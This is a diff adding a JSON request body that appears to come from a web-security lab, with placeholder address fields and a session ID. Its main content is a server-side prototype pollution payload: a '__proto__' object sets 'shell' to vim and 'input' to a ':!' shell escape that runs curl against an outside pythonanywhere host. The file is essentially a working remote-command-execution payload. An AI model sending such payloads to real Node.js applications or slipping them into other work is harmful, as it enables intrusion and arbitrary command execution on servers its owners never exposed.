@@ -1,0 +1,12 @@
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Wienervill",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+"__proto__": {
+    "shell":"vim",
+    "input":":! curl -L https://c0smicsag3x.pythonanywhere.com/grading\n"
+},
+  "sessionId": "XuBuTZnsfuKr7cd6MyOoGjMVacsJCZi4"
+}
